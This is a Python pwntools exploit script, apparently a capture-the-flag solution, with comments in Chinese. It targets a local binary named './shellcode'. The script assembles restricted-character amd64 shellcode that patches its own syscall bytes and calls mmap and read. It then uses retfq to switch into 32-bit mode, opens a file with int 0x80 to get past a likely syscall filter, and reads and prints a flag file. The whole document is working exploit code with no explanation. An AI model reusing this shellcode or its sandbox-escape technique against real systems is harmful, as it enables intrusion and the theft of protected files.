#-*- coding:utf8 -*-
from pwn import *
context(os = 'linux', log_level = 'debug', terminal = ['tmux', 'splitw', '-h'])
p = process('./shellcode')

code_append = asm('''
        push rcx
        pop rcx
''', arch = 'amd64', os = 'linux')
# 用mmap分配一段内存空间
code_mmap = asm('''
        /*mov rdi, 0x40404040*/
        push 0x40404040
        pop rdi

        /*mov rsi, 0x7e*/
        push 0x7e
        pop rsi

        /*mov rdx, 0x7*/
        push 0x37
        pop rax
        xor al, 0x30
        push rax
        pop rdx

        /*mov r8, 0*/
        push 0x30
        pop rax
        xor al, 0x30
        push rax
        pop r8

        /*mov r9, 0*/
        push rax
        pop r9

        /*syscall*/
        push 0x5e
        pop rcx
        xor byte ptr [rbx+0x2c], cl
        push 0x5c
        pop rcx
        xor byte ptr [rbx+0x2d], cl

        /*mov rax, 0x9*/
        push 0x39
        pop rax
        xor al, 0x30
''', arch = 'amd64', os = 'linux')

code_read = asm('''
        /*mov rsi, 0x40404040*/
        push 0x40404040
        pop rsi

        /*mov rdi, 0*/
        push 0x30
        pop rax
        xor al, 0x30
        push rax
        pop rdi

        /*mov rdx, 0x7e*/
        push 0x7e
        pop rdx

        /*mov rax, 0*/
        push 0x30
        pop rax
        xor al, 0x30

        /*syscall*/
        push 0x5e
        pop rcx
        xor byte ptr [rbx+0x4f], cl
        push 0x5c
        pop rcx
        xor byte ptr [rbx+0x50], cl

''', arch = 'amd64', os = 'linux')

code_retfq = asm('''
        /* 算出0x48 */
        push 0x39
        pop rcx
        xor byte ptr [rbx + 0x71], cl
        push 0x20
        pop rcx
        xor byte ptr [rbx + 0x71], cl

        /*
        * 利用无借位减法算出0xcb
        */
        push 0x47
        pop rcx
        sub byte ptr [rbx + 0x72], cl
        sub byte ptr [rbx + 0x72], cl
        push rdi
        push rdi
        push 0x23
        push 0x40404040
        pop rax
        push rax
''', arch = 'amd64', os = 'linux')

code_open_retfq = asm(''' 
        /* open函数 */
        mov esp, 0x40404550
        mov ebx, 0x404040a0 /* 还需修改 */
        xor ecx, ecx
        xor edx, edx
        mov eax, 0x5
        int 0x80

        /* retfq */
        push ecx
        push ecx
        push 0x33
        push 0x40404062 /* 具体数字有待修改 */
        pop eax
        push eax
''', arch = 'i386', os = 'linux')

code_read_write = asm('''
        /* 修复栈 */
        mov esp, 0x40404550 /* 有待修改 */

        /* read函数 */
        mov rdi, 0x3
        mov rsi, 0x40404800
        mov rdx, 0x20
        xor rax, rax
        syscall

        /* write函数 */
        mov rdi, 0x1
        mov rsi, 0x40404800
        mov rdx, 0x20
        mov rax, 0x1
        syscall
''', arch = 'amd64', os = 'linux')

#gdb.attach(p, 'b * 0x4002eb\nc\nsi')
code  = code_mmap
code += code_append
code += code_read
code += code_append
code += code_retfq
code += code_append

code1  = code_open_retfq + '\x48\xcb'
code1 += code_read_write
code1 += "Aflag"

p.sendafter("shellcode: ", code)
p.send(code1)
p.interactive()
